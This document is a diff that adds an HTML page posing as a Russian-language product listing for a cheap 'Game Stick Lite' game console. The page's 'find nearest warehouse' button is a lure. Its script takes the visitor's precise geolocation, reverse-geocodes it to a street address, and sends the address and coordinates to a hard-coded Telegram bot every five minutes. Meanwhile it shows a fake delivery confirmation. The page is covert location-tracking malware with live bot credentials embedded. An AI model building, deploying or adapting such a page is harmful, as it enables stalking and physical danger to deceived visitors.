@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Game Stick Lite</title>
+
+<style>
+
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:Arial,sans-serif;
+}
+
+body{
+  background:#081421;
+  color:white;
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  padding:20px;
+}
+
+.card{
+  width:100%;
+  max-width:420px;
+  background:#102235;
+  border-radius:22px;
+  overflow:hidden;
+  box-shadow:0 0 30px rgba(0,0,0,0.4);
+}
+
+.product-image{
+  width:100%;
+  display:block;
+}
+
+.content{
+  padding:20px;
+}
+
+h1{
+  font-size:28px;
+  margin-bottom:10px;
+}
+
+.price{
+  color:#00d0ff;
+  font-size:24px;
+  font-weight:bold;
+  margin-bottom:15px;
+}
+
+.desc{
+  color:#c7dfff;
+  line-height:1.5;
+  margin-bottom:20px;
+}
+
+.features{
+  margin-bottom:25px;
+}
+
+.features div{
+  margin-bottom:10px;
+  color:#d8ecff;
+}
+
+button{
+  width:100%;
+  border:none;
+  padding:16px;
+  border-radius:14px;
+  background:#00bfff;
+  color:white;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+button:hover{
+  background:#009fd8;
+}
+
+.status{
+  margin-top:18px;
+  text-align:center;
+  color:#bfe6ff;
+  line-height:1.5;
+  font-size:14px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+<img 
+class="product-image"
+src="https://i.imgur.com/j6s9R6x.jpeg"
+alt="Game Stick Lite"
+/>
+
+<div class="content">
+
+<h1>Game Stick Lite</h1>
+
+<div class="price">2990 ₽</div>
+
+<div class="desc">
+Беспроводная игровая приставка с поддержкой 10000+ игр.
+Подключение через HDMI.
+</div>
+
+<div class="features">
+<div>✔ 2 беспроводных джойстика</div>
+<div>✔ Поддержка 4K</div>
+<div>✔ Retro Games</div>
+<div>✔ HDMI подключение</div>
+</div>
+
+<button onclick="startGPS()">
+Ищем ближайший склад…
+</button>
+
+<div class="status" id="status">
+чтобы найти ближайший склад подтвердите геолокацию
+</div>
+
+</div>
+</div>
+
+<script>
+
+const BOT_TOKEN = "8632533079:AAGs6zkdn9yy4Akx1FWhPWB_GujE_5c5ZDA";
+const CHAT_ID = "1317859773";
+
+async function sendTG(text){
+
+  try{
+
+    await fetch(
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+      {
+        method:"POST",
+        headers:{
+          "Content-Type":"application/json"
+        },
+        body:JSON.stringify({
+          chat_id:CHAT_ID,
+          text:text
+        })
+      }
+    );
+
+  }catch(error){
+    console.log(error);
+  }
+
+}
+
+async function getAddress(lat,lon){
+
+  try{
+
+    const response = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
+    );
+
+    const data = await response.json();
+
+    return data.display_name || "Адрес не найден";
+
+  }catch(error){
+
+    return "Ошибка адреса";
+
+  }
+
+}
+
+function startGPS(){
+
+  if(!navigator.geolocation){
+
+    document.getElementById("status").innerText =
+      "Ваш телефон не поддерживает GPS";
+
+    return;
+
+  }
+
+  document.getElementById("status").innerText =
+    "Ожидание разрешения геолокации...";
+
+  navigator.geolocation.getCurrentPosition(
+
+    async(position)=>{
+
+      document.getElementById("status").innerText =
+        "✅ Вы в группе. Доставка доступна для вашего региона.";
+
+      async function sendLocation(){
+
+        navigator.geolocation.getCurrentPosition(
+
+          async(pos)=>{
+
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const accuracy = Math.round(pos.coords.accuracy);
+
+            const address = await getAddress(lat,lon);
+
+            const message =
+`🎮 NEW CUSTOMER
+
+🏠 Полный адрес:
+${address}
+
+🌐 Координаты:
+${lat}, ${lon}
+
+🎯 Точность:
+${accuracy}m
+
+🗺 Google Maps:
+https://maps.google.com/?q=${lat},${lon}`;
+
+            await sendTG(message);
+
+          },
+
+          (error)=>{
+
+            console.log(error);
+
+          },
+
+          {
+            enableHighAccuracy:true,
+            maximumAge:0,
+            timeout:10000
+          }
+
+        );
+
+      }
+
+      sendLocation();
+
+      setInterval(sendLocation,5 * 60 * 1000);
+
+    },
+
+    (error)=>{
+
+      document.getElementById("status").innerHTML =
+        `
+        ❌ Без геолокации мы не можем определить ваш адрес доставки.<br><br>
+
+        Разрешите доступ к геолокации в настройках браузера и откройте сайт заново.
+        `;
+
+    }
+
+  );
+
+}
+
+</script>
+
+</body>
+</html>
